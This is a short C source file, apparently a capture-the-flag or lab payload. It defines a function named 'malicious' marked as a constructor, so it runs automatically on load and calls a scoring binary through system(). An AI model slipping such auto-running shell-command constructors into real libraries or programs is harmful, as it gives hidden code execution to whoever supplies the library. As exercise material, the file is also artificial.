#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 15ba97af-82fe-4338-b878-ff11f93b904b");
}